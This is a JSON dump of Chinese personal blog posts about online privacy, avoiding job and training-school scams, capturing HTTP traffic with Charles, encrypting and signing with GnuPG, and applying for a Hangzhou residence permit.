但是，随着各种各样的互联网产品都进行实名认证，个人的隐私信息会被各个互联网企业收集，甚至被不法企业滥用，比如手机号、身份证、学生证、家庭住址、工作单位、年龄等等个人真实信息会被贩卖，甚至一些互联网产品就专门靠收集这些信息来赚钱。假如你要使用某个产品，他要求必须要实名认证，你这个信息是给还是不给？此外即使我们相信企业不会主动贩卖我们的个人隐私，通常中小企业的各种网络安全方面的措施是不规范的，就网易这种老牌的互联网企业邮箱还被“拖库”了呢？万一企业数据库被黑客入侵，也同样可以拿到大量的个人实名信息，这些数据对于从事“黑产”链条的人来说可谓是大大降低了他们从事诈骗、犯罪的门槛。你想啊！每一条数据都是真实的，通过大数据分析，可完整掌控个人的日常行为，犯罪分子可能比你亲爸亲妈还了解你每天干什么？几点上班，几点下班（打车、公交数据「杭州」公交都可以支付宝了），每天吃了什么（外卖数据，自己做饭？有的菜市场也可以移动支付），平时网购买了什么东西（通过购买的物品加上实名认证的数据推测你最近可能需要哪些东西，比如买了奶粉，和小孩的玩具啊什么的，推测你有孩子了，从而骗子可以针对这块对你实施诈骗行为） 就拿我去年来说吧，因为淘宝网购一台kindle，我的网购在淘宝都是实名认证的，快递填的手机号、地址都是真实的，我不确定这个信息是淘宝还是快递主动泄漏，还是黑客入侵后获取的数据，总是，因为我的信息泄漏导致诈骗到我身上， 我第二天中午刚刚拿到kindle没5分钟，就有一个自称淘宝客服的人电话我说我订单有问题，当然这种诈骗我一听就知道是假的，我直接回过去怼他，骂他一顿，就挂电话，但是如果是一个对于网络不熟悉，对淘宝规则不熟悉，接收信息比较闭塞的人来说很可能就信以为真了。 上面说的隐私泄漏，不要以为我危言耸听，我去年在github提交了一段代码，忘记删除了邮件地址和密码，在commit后短短不到3个钟头，就被乌云的人邮件到公司说我们的网站有漏洞，并提供了大量的入侵截图（乌云目前已涉嫌违法被查，关闭)，个人的隐私稍微不注意就可能泄漏，而不法分子通过一个链条就可以深挖到你各种丰富多样的数据。 说了这么多，其实结论就是网络是把双刃剑，同样实名认证也是一把双刃剑，一定程度上是可以减少违法的人数，但是对于一些作恶的公司、黑产，是在给他们提供犯罪的完整而全网的数据。目前法律已经颁发，我们个人只能在日常生活中尽量提高保护自我的警惕性，比如 身份证1.不要随意把身份证给其他人，大学我就被同学要去身份证 然后拿去办卡，鬼知道拿去干了什么，这个世界除了自己，家人谁都不要轻信。2.非要身份证信息不可，给复印件一定要备注用途，比如“仅限于办理信用卡”3.不要把身份证等敏感信息存储在各种网盘里，非常不安全，有必要本地加密后在存储。4.除了身份证以外你认为敏感的数据都可以按2、3两条来。 就我工作中就遇到各种不法分子用他人身份证注册后从事违法事情的真实案例不计其数 说一说有趣的事情，一开始我们要求注册提交身份证进行实名认证，有些不法分子就弄一堆身份证注册，当然都不是他自己的。手机号也可以是别人的啊！ 然后我们要求注册提供手持身份证照片，他们也可以提供一堆。 在后来，我们要求他们的手持身份证信息必须是实时拍的，比如有些人用别人的身份证信息注册，手持拍照的背景都是一样的，而且大热天的居然穿着棉袄拍照，这不是骗子是什么？而且通常提交过来的身份证信息都是农村的人，年龄都还比较大或者比较小，哎，农村你用个锅碗瓢盆甚至2个鸡蛋的就可以换条真实信息，这成本可是很低的。 总之，上有政策，下有对策，你在进步，骗子也在进步。 网络购物1.地址不要非常精确，我是精确到几栋就可以了，有时候直接填公司地址。2.电话可以用比如阿里小号这种的。 个人隐私靠法律保护是被动的，只有自己认清这个社会，提高自己保护自己的意识，提高警惕性，才能减少被骗的概率。 社交活动很多人喜欢晒照片，晒定位，晒娃娃。如果是微信还好，比较是比较隐私的，当然前提是你微信只加认识的人，那如果你在微博啊什么的公开的社交网络发布一些比较隐私的照片也有可能被人分析利用。另外手机拍摄照片的元数据里其实都包含了文件的创建时间、位置、大小等等信息。 在加上如果还有定位的地址可能更容易被骗子利用。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"如何避免求职被骗","slug":"如何避免求职被骗","date":"2017-08-03T12:00:10.000Z","updated":"2021-02-26T06:05:29.330Z","comments":true,"path":"posts/2229770801.html","link":"","permalink":"https://awen.me/posts/2229770801.html","excerpt":"最近一位大学生李文星被BOSS直聘上的“李鬼”公司骗入传销组织而被害的事情火了。大家纷纷把矛头指向了招聘网站信息审核把关不严格，导致被骗子钻了空，可是这互联网上的招聘网站有很多家，几乎每家都有骗子在。一些常见的骗子公司，比如类似达内这样的IT培训公司，比如传销组织。确实招聘网站有着逃脱不掉的干系。 早在几年前，传销给人的印象还是拉人头，赚人头费，我记得我老家就有很多人被骗到传销组织，然后打电话告诉亲朋好友忽悠过去。而到了今天，骗子们早已经包装成xxxx互联网公司来骗人的，而且还会问一些技术性问题，让你深信是正规公司。","text":"最近一位大学生李文星被BOSS直聘上的“李鬼”公司骗入传销组织而被害的事情火了。大家纷纷把矛头指向了招聘网站信息审核把关不严格，导致被骗子钻了空，可是这互联网上的招聘网站有很多家，几乎每家都有骗子在。一些常见的骗子公司，比如类似达内这样的IT培训公司，比如传销组织。确实招聘网站有着逃脱不掉的干系。 早在几年前，传销给人的印象还是拉人头，赚人头费，我记得我老家就有很多人被骗到传销组织，然后打电话告诉亲朋好友忽悠过去。而到了今天，骗子们早已经包装成xxxx互联网公司来骗人的，而且还会问一些技术性问题，让你深信是正规公司。 记得我大学刚毕业，我一个很久不和我联系的初中同学还给我打电话说有一个非常赚钱的机会，要我过去，在给我电话的过程中我就感觉不对劲，我表示怀疑，然后拒绝了。 对于任何刚毕业的学生来说，由于没有工作经验，一个是为了证明自己长大了可以靠自己，二是希望早点找到工作，养活自己，毕竟大多数人还不是富二代、官二代。没办法一直靠家里，总得自己造血吧！而当你有这个念头的时候，骗子也在打有这种想法的社会阅历浅的人的主意。 抛开传销来说，我亲身经历，比如14年的时候由于想转行业，因为自己本身也做过系统和网络相关的工作，但是由于自己是非科班出生，对编程这块比较欠缺，所以希望补下这块的知识，于是自己找了家培训机构充电，在这个过程中我就亲眼见到了这家无良的培训机构如何在招聘网站发布招聘需求把求职者骗过来，然后安排他们面试，每天我都能看见很多人被骗过来做面试题，这些人有些根本就不是计算机专业或者是对计算机行业根本没兴趣的人，只是看见招聘文员的岗位过来面试的，也被要求做例如java相关的面试题，然后你做不出来，他们会否定你，然后忽悠你来报他们的所谓实训课程，不用交钱。实训完包分配，然后等学完上班了在按月给学费，听起来很美好，可是当你交了定金，签了合同，其实是和一些贷款公司签的合同，比如宜信啊、中银消费啊这些消费贷款公司签的合同。学费基本都是小2万块钱。在我培训的那一个班里有一部分是因为自己想充电，而自愿交钱培训的，这其中不乏一些名气比较高的大学，比如浙大的学生也过来学习，还有一些就是我上面说的被忽悠过来面试而加入的。有一次我上完课去卫生间，遇到一个过来面试的和他聊起来，我就告诉他如果你有兴趣，希望从事这一行业并且接收的了这个学费你可以考虑，如果完全没兴趣千万别被他们忽悠，骗你过来面试的。 所谓的项目经理，其实技术水平烂到吊渣，大部分是因为自己学不好找不到公司被迫过来当的项目经理。 所谓的包就业，这个我从去参加培训我就知道这是骗人的，我也根本没打算要他们所谓的包分配服务，因此到课程没结束我就提前出来自己找工作了。那些把希望寄托在培训公司给找工作的最后都进了外包公司。 说了我自己的经历，其实就是想给需求找工作的人提个醒，找工作一定要擦亮眼睛，如何擦呢？我来给你指点一二 首先，一定要找正规的公司，如何判断正规不正规呢？看公司规模和主营业务是什么，是否和自己的方向对口；如果不对口，直接过吧，即使给你钱在多，你也干不长久。只有当找到和自己兴趣，方向对口的工作，你才有干劲，才会成长的快。 第二，辨别公司是否是虚假宣传，是否是骗子公司，这个正规公司都是在工商局备案的，去全国企业信用信息公示系统输入公司名称，然后查询公司的注册信息，比如查询杭州又拍云科技有限公司 查哪些资料呢？一般经营正常的公司在列入经营异常名录信息和列入严重违法失信企业名单（黑名单）信息中应该是没有数据的，如果有，基本这样的公司就不要去了。 此外，还可以看公司的注册资本，看实缴资本是多少，因为现在是可以认缴的，可以在年度报告里查看最近一年的实缴资本 此外看下公司的经营项目和公司地址是否一致，另外可以去公司对应的官网看一看，甚至能注册的可以自己注册试一试对应的产品，一来验证下公司是有自己的产品的。二来，可以再次确定公司的产品是否是自己感兴趣的。 现在还有很多第三方的企业信息查询平台，比如天眼、企查查都可以查公司的关系啊，股东信息等等。做个大概的了解，比如看公司的法律诉讼都有哪些，如果这家公司的法律诉讼有大量的比如劳动纠纷啊，你也趁早打住，不要去了。 现在有很多培训机构打着招聘的幌子骗人过去面试，你可以用上面的方法识别他啊！比如在智联招聘搜索达内现在还在打着招聘的幌子呢 另外，你可以去搜索引擎、知乎等渠道去找外界对于目标公司的评价啊 然后上面说的企查查，也可以看诉讼啊，相比较网上的信息，法律诉讼应该更有价值，更靠得住。 当然最后判决谁赢谁输这个你自己感觉咯。 当然我这只是举例，至于上面的判决就是判的是谁我没看，不过我相信法律是公正的，肯定是弱的一方无法提供有效的证据而失败告终。 此外，比如李文星这样的被“李鬼”公司骗，打着正规企业的招聘需求，骗到其他城市，这个尤其要注意核实对方的真实信息，像我就有个习惯，不论任何陌生电话我都先搜下，当未接电话之前先判断下这个公司的电话，如果搜索的结果是诈骗，完全就不要理会了。 直接挂断。如果有信息可查，那就接。 那么判断公司没有问题后，你去面试，如果聊的还可以，不要不好意思和他们聊薪酬福利，除了基本的工资以外，要问清楚对方缴纳不缴纳五险一金，这个很重要，如果没有五险一金，这种公司就不正规了。至少要有五险，一些大的城市办理一些业务，比如杭州考驾照都要求居住证，摇号要居住证，居住证办理其中有一项就是要求在杭州缴纳社保满一年。 基本工资一般招聘的时候都有写，比如5-8k这个区间，那基本就是5k往上了。看你能力能谈多少。通常你可以去搜下目标岗位的工资水平是在那个区间之内，这块网上都有一些网站在做。社保要确认是全额缴纳还是按最低基数缴纳，这个要问清楚。最后，一定要签劳动合同。满足不了这些（社保、基本工资、合同）的公司基本都没什么前景。劳动合同是以后你和公司如果产生劳动纠纷的最有效的证据。 其次，当满足了上述的一些内容后，你进入公司以后一般有试用期，这段时间，既是公司考察你也是你考察公司，如果你发现不对劲，比如刚加入公司第一个月就拖欠工资，迟发工资的，然后老板画大饼，说给期权，你也就好好考虑考虑吧！如果你的老板说给期权，那你就问他什么时候签协议，如果只是嘴上说说而已，骚年，你是来工作的，目的就是赚钱养活自己先，什么梦想啊都是建立在养活自己的前提下才可以。如果你不缺钱，又有时间，那无所谓，相信大部分人工作都是赚钱吧！或者你在第一个月就感觉你不喜欢你的主管和公司氛围。趁早走。 其实我的建议是假如是刚毕业，假设不是技术牛逼到上天，还是踏踏实实的把技术学好，把自身能力提上去，如果一个公司还不错，都非常巧妙的避开了我说的那些坑，那么恭喜你，如果你正在踩到这些坑，也没关系，人总是经历过才知不易嘛。不过我是希望这种阅历越少越好。就这样！ 假如你碰到了些垃圾公司，说明你其实自己的水平和能力还没有达到好公司要你的地步，好好提升自己的能力，让自己匹配得上那些公司的岗位才是关键。如果真的遇到拖欠工资不发，公司倒闭等等情况，假如不多的话，比如一两千，就别走劳动合同这一步了，可以举报，但是别真去和他们打官司，你还年轻，耗费时间在这种事情上，其实你花费的时间成本远远比和他们打官司贵的多。光走一套司法流程都要小半年，耗不起。以上是本人分享的一些关于求职中的小窍门吧！希望有需要的人能够用的上。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"使用Charles 抓包","slug":"使用Charles-抓包","date":"2017-08-03T01:34:27.000Z","updated":"2021-02-26T06:05:29.307Z","comments":true,"path":"posts/1169435972.html","link":"","permalink":"https://awen.me/posts/1169435972.html","excerpt":"在日常的工作中，我经常使用charles 来分析http请求，它非常的强大，可以去官网下载https://www.charlesproxy.com/ 需要注意charles是一款收费软件，但是你可以免费使用，只不过需要忍受启动加载慢的过程。","text":"在日常的工作中，我经常使用charles 来分析http请求，它非常的强大，可以去官网下载https://www.charlesproxy.com/ 需要注意charles是一款收费软件，但是你可以免费使用，只不过需要忍受启动加载慢的过程。 设置为系统代理1.安装完毕后启动，然后选择Proxy-macOS Proxy PC抓包就可以把系统的http请求代理到charles了，如果你需要分析https的数据包，点击help- SSL proxying- INSTALL charles root certificate 安装 默认情况下选项卡是在Structur上，他会安装网站的域名进行分组 你可以切换到Sequence上查看所有的未分组请求的状态、请求方法、主机地址，请求URL路径等等 如果你只希望抓取某个域名的数据包，可以选择Porxy-Recording Setting，然后切换到Include 然后输入协议 hosts 端口即可 当你点击某一个请求包的时候，下面会显示你的请求信息和响应信息以及http的body体内容，可以通过过滤器过滤你的域名方法等等。 移动端抓包选择Proxy- Proxy Settings，填写端口,假设本机地址是10.0.1.15，那么就去移动端设置代理 然后移动端，以iphone为例，点击设置–无线网 找到你链接的wifi，注意wifi必须与pc同网段，然后选择http代理–手动，填写服务器和端口 此时pc端会弹出一个对话框 然后就可以看到了移动端的请求了 查看请求文件的实体内容 注意：如果没有发现数据包，很可能是设置了Recording Setting 只运行某个域名的包通过了，通常链接后注意看下方状态是否有类似GET POST请求URL 一闪而过，如果有说明是请求了但是不匹配你的url所以忽略了。另外，移动端抓取SSL的包，需要安装证书，具体方法是点击help- SSL proxying- INSTALL charles root on a Mobile certificate Device or Remote Browser 安装 然后会弹出个对话框 你在移动端打开浏览器输入chls.pro/ssl 去下载文件安装，然后输入密码确认后完成安装。 安装完后进入系统-通用-关于本机–证书信任设置，针对根证书启动完全信任 开启charles Porxy CA","categories":[],"tags":[{"name":"抓包","slug":"抓包","permalink":"https://awen.me/tags/%E6%8A%93%E5%8C%85/"}]},{"title":"使用GnuPG(PGP)加密信息及数字签名教程","slug":"使用GnuPG-PGP-加密信息及数字签名教程","date":"2017-08-02T22:43:00.000Z","updated":"2021-02-26T06:05:29.307Z","comments":true,"path":"posts/1940617791.html","link":"","permalink":"https://awen.me/posts/1940617791.html","excerpt":"现在社会，隐私已经成为一个伪命题，我们每年都能看到各种各样的信息泄漏事件，比如网易邮箱泄密，在比如美国的希拉里逃过了FBI逃过了维基解密，却逃不过钓鱼邮件。导致邮件信息外泄。那么我们普通人日常工作中可能也会有一些比较重要的资料需要发送，这个时候，我们如果保障资料发送过去不会被修改、不会被监听？","text":"现在社会，隐私已经成为一个伪命题，我们每年都能看到各种各样的信息泄漏事件，比如网易邮箱泄密，在比如美国的希拉里逃过了FBI逃过了维基解密，却逃不过钓鱼邮件。导致邮件信息外泄。那么我们普通人日常工作中可能也会有一些比较重要的资料需要发送，这个时候，我们如果保障资料发送过去不会被修改、不会被监听？ 有的人可能不相信国内的邮箱，以用qq、网易等国内邮箱为耻，喜欢用gmial，但是你可能不知道，其实gmail也不安全，还记得斯诺登的棱镜事件吗？要知道google向美国情报局提供美国公民隐私的哦。当然，天朝也好不到哪里去，抛开这些政治上的因素，我们也不希望自己的信息随随便便的被人拿到拿去从事一些非法的勾当。那么就跟我来学习如何给你的文件、邮件、文本内容进行加密吧！ 什么是pgp它是目前最流行、最好用的加密工具之一。 1991年，程序员Phil Zimmermann为了避开政府监视，开发了加密软件PGP。这个软件非常好用，迅速流传开来，成了许多程序员的必备工具。但是，它是商业软件，不能自由使用。所以，自由软件基金会决定，开发一个PGP的替代品，取名为GnuPG。这就是GPG的由来。GPG有许多用途，本文主要介绍邮件的加密，不同的邮件客户端有不同的设置。 安装brew install Caskroom/cask/gpgtools或者去官网下载 使用查看帮助gpg --help生成签名gpg --gen-key 运行后会要求进行一些设置 第一步，设置签名的算法，默认是rsa gpg (GnuPG/MacGPG2) 2.0.30; Copyright (C) 2015 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) Your selection? 1 然后是设置签名的长度 RSA keys may be between 1024 and 4096 bits long. What keysize do you want? (2048) 4096 Requested keysize is 4096 bits设置签名的过期时间，0为永不过期 Please specify how long the key should be valid. 0 = key does not expire &lt;n&gt; = key expires in n days &lt;n&gt;w = key expires in n weeks &lt;n&gt;m = key expires in n months &lt;n&gt;y = key expires in n years Key is valid for? (0) Key does not expire at all 确认信息输入y Is this correct? (y/N) y GnuPG needs to construct a user ID to identify your key.设置名称 Real name: wenjun.fang设置自己邮件地址 Email address: wenjun.fang@awen.com Comment: You selected this USER-ID: &quot;wenjun.fang &lt;wenjun.fang@awen.com&gt;&quot;确认无误输入O Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O You need a Passphrase to protect your secret key. We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number此时会弹出一个输入密码的对话框，重复输入2次即可 ![](https://file.awen.me/blog/2017-08-02-230104.jpg!awen)最后得到一个签名 generator a better chance to gain enough entropy. gpg: key 593A11D9 marked as ultimately trusted public and secret key created and signed. gpg: checking the trustdb gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model gpg: depth: 0 valid: 2 signed: 0 trust: 0-, 0q, 0n, 0m, 0f, 2u pub 4096R/593A11D9 2017-08-02 Key fingerprint = 6095 B126 B7DC 6FAD C187 9BA6 83BA 4F1D 593A 11D9 uid [ultimate] wenjun.fang &lt;wenjun.fang@awen.com&gt; sub 4096R/F961C43E 2017-08-02 查看gpg --list-keys /Users/wenjun/.gnupg/pubring.gpg -------------------------------- pub 4096R/593A11D1 2017-08-02 uid [ultimate] wenjun.fang &lt;wenjun.fang@awen.com&gt; sub 4096R/F961C43E 2017-08-02从上面我们需要知道以下信息 pub 是你的公钥信息 其中593A11D1是你的公钥id，uid 是你的名字wenjun.fang 导出公钥gpg -a –output key.public –export UID 把自己的公钥发布到公共服务器gpg --keyserver keys.gnupg.net --send-key ID参数 –search-key 用于指定搜索关键字，可以是uid的名字或者email地址部分。这样其他人搜索你的这个公钥后就可以把要发送给你的邮件内容进行加密然后只有你能解密。 ## 导入他人公钥 gpg --keyserver keys.gnupg.net --recv-key 72E75B05其中72E75B05是其他人的公钥。 导入公钥还有另一种方法：如果我把公钥文件直接发送了给你，你也可以跳过公钥服务器。下面假设我的公钥文件 key.public 已发送给你，你运行如下命令就可以导入我的公钥了： gpg --import key.public核对公钥的指纹值并签收公钥 把对方的公钥导入到本机后，就已经可以用它来加密信息或者用于校验我的数字签名。不过这样每次操作时都会提示公钥不可信，因为虽然你导入了我的公钥，但存在导入冒充者的公钥的可能性。所以你需要进一步跟我核对公钥是否正确，然后签收（sign key）它。 因为公钥有可能出现冒牌货，所以每个公钥里都加入了指纹值，使用下面命令可以查看指纹值： gpg --fingerprint pub 4096R/593A11D1 2017-08-02 Key fingerprint = 6095 B126 B7DC 6FAD C187 9BA6 83BA 4F1D 593A 11D9 #这就是指纹信息 uid [ultimate] wenjun.fang &lt;wenjun.fang@awen.com&gt; sub 4096R/F961C43E 2017-08-02确定取得的公钥是真货之后，使用如下命令对这个公钥进行签收（sign key）： gpg --sign-key ivarptr运行上面的命令之后它提示你再确认一次指纹值，输入y并按回车确定。 提示，如果发现获取回来的是冒牌货，可以使用如下的命令删除它： gpg --delete-keys ivarptr加密一个文件 使用文本编辑器（比如记事本或者 vim、echo）创建一个名为 message.txt 的文件，里面写上任意一行文字，然后使用如下的命令加密它： gpg -a –output message-ciper.txt -r xxxx@gmail.com -e message.txt 其中参数： -a 表示输出文本文件格式。–output 指定输出（即加密后）的文件名。-r 指定信息的接收者（recipient）公钥的uid，可以是名字也可以是email地址。-e 表示这次要执行的是加密（encrypt）操作。 执行完毕之后会在当前文件夹产生文件 message-ciper.txt，这个就是被加密之后的文件。 注：如果你要加密的是一个二进制文件，则可以省略 -a 参数，这样产生的加密文件的体积会小一些。 ## 解密一个文件 现在假设我已经收到你寄过来的加密文件 message-ciper.txt，使用如下的命令解密： gpg --output message-plain.txt -d message-ciper.txt其中参数： –output 指定输出（即解密后）的文件名。-d 表示这次要执行的是解密（decrypt）操作。 GnuPG 程序会自动使用我的私钥来解密信息，最后得到一个跟原始内容一样的文本文件 message-plain.txt。 至此，你已经学会使用 GnuPG 加密解密文件了。 提示1：导入公钥、核对公钥的指纹值、签名公钥这些操作你只需做一次，以后就可以重复多次使用该公钥加密信息并发送给对方。提示2：如果你想自己体会整个加密和解密过程，可以用自己的公钥加密信息，然后用自己的私钥解密，只需把上面第3步的命令当中的接收者uid（ivarptr@126.com）更改为自己的uid即可。 数字签名一个文件gpg -a -b message.txt其中参数 -a 表示输出文本文件格式。-b 表示以生成独立的签名文件的方式进行签名。 命令执行完毕之后，会在当前文件夹里产生一个 message.txt.asc 的文件，这个文件即签名。现在我应该把原信息文件 message.txt 连同签名文件 message.txt.asc 一起寄给你，然后你使用如下命令检验： $ gpg --verify message.txt.asc如无意外，应该会看到如下两行： gpg: Signature made Thu 18 Apr 2013 12:35:00 AM CST using RSA key ID 72E75B05 gpg: Good signature from “ivarptr (ivarptr on Twitter) &lt;ivarptr@126.com&gt;”其中最重要的是 “Good signature” 字样，表示通过检验，否则表示没通过检验（即意味着原信息的内容被篡改或者原信息不是我发出的）。提示：如果你有多个私钥，在签名时需要加上参数 -u 指定私钥的 uid。 以上部分出处参考月光博客 给邮件加密上面的上传、创建证书其实也可以在图形化解密操作 当你安装完pgp后，会有一些快捷键 我们现在来写一封邮件 选择要加密的内容，然后邮件选择服务，选择OpenPGP：Sign selection 对选中的文本内容进行签名 如果你的系统有多个id，需要选择，并且还要输入密码确认 确认后会看到文件内容已经变了，到这一步其实只是把文件内容签名了，但是真实的文件内容还未加密 然后继续选择签名部分的内容，邮件选择服务–OpenPGP Encrypt Selection 这个时候会要求你选择加密的公钥是谁，也就是你这个邮件是发给谁的你就选择谁的id 另外如图所示的地方也要选择下你自己的签名 最后得到的就是以 -----BEGIN PGP MESSAGE----- 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 =zckI -----END PGP MESSAGE-----的文件，然后我们发送 然后对方收到的也是这个邮件 解密也是选择邮件内容 然后邮件选择服务—选择OpenPGP Decrypt selection to new windows 然后会要求你输入密码 就会对文件内容进行解密 mac 加密只需要安装一个GPGMail 的扩展并且配置gpg密钥 即可加密 只有mac 客户端才能解密并带上签名标识 如果你通过邮件web 端看则是这样的","categories":[],"tags":[{"name":"email","slug":"email","permalink":"https://awen.me/tags/email/"}]},{"title":"如何在杭州办理居住证","slug":"如何在杭州办理居住证","date":"2017-07-31T06:38:44.000Z","updated":"2021-02-26T06:05:29.325Z","comments":true,"path":"posts/2779159472.html","link":"","permalink":"https://awen.me/posts/2779159472.html","excerpt":"此前，我有办理过暂住证；不过自从G20之后就停止办理暂住证了，然后杭州新规是取消暂住证改为居住证。我一直没去办理，今天跑去办了下，说下流程吧！给有需要的朋友 网上申领目前杭州推出最多跑一次的口号，上线了一个居住证在线申请网站，地址http://zjjzzgl.zjsgat.gov.cn:9090/zahlw/index 注册完后，它有好几个选项；不同的选项需要提交不同的资料，我这里选择的是符合合法稳定就业条件的，因为相对于要找房东拿房产证明啊之类的，这个资料更容易些。","text":"此前，我有办理过暂住证；不过自从G20之后就停止办理暂住证了，然后杭州新规是取消暂住证改为居住证。我一直没去办理，今天跑去办了下，说下流程吧！给有需要的朋友 网上申领目前杭州推出最多跑一次的口号，上线了一个居住证在线申请网站，地址http://zjjzzgl.zjsgat.gov.cn:9090/zahlw/index 注册完后，它有好几个选项；不同的选项需要提交不同的资料，我这里选择的是符合合法稳定就业条件的，因为相对于要找房东拿房产证明啊之类的，这个资料更容易些。 看下申请说明 流动人口申领《浙江居住证》应满足在居住地连续居住登记满六个月，须提供本人有效身份证件或身份证明以及近期一寸免冠正面相片，并对照居住证申领条件提供以下证明材料： 一、符合合法稳定就业条件的，须提供：□在市区连续缴纳满1年以上（不含1月以上中断缴费或补缴）的社保凭证；根据不同就业类型提供相应证明材料：□满1年以上的劳动（聘用）合同或者农业承包合同（土地承租协议）；□满1年以上的工商营业执照（申请人系法定代表人、实际经营者或独资企业的投资人）以及相应年度报告和未列入经营异常名录的证明；□满1年以上的《网上创业就业认定证明》；□满1年以上的民办非企业单位证明或证件；□满1年以上的《道路运输从业人员从业资格证》（或《杭州市出租汽车驾驶员服务资格证》）以及《杭州市客运出租汽车驾驶员服务监督卡》； 一大早我就去打印参保证明，然后上传资料。不过不幸的是我提交完资料，审核被拒绝了，原因是我打印的参保证明是最近24个月的，最开始我的单位是第三方代缴的。 我纳闷，资料写的是最近一年就可以，我这明显满足要求啊！被拒绝后我开始去我所在的社区询问原因 线下办理我把的参保证明和劳动合同递给了接到的工作人员，它看了看说你这个符合要求的，然后要求我提供以下信息： 劳动合同复印件，4页纸都需要复印，注意单位公章要清楚。 参保证明原件。 当时是11点，就被打发走了，让下午2点在过去。 下午2点过去递交资料又让我拿劳动合同原件和一寸照片。额，当时心里一万只草泥马奔腾而过。好吧，回去拿原件和照片。然后填写相关资料，会给你一个回执单，大概15个工作日可以去它指定的派出所户籍室领取。 最后总结下，采用符合合法稳定就业条件的居住证申领要求提交以下材料： 最近12个月的参保证明，可以带上身份证或社保卡去附件的社保中心自助打印（打印时选个人参保证明），不要钱。 身份证复印件 正反面都需要。 劳动合同复印件和原件都要带。 近期一寸照一张。 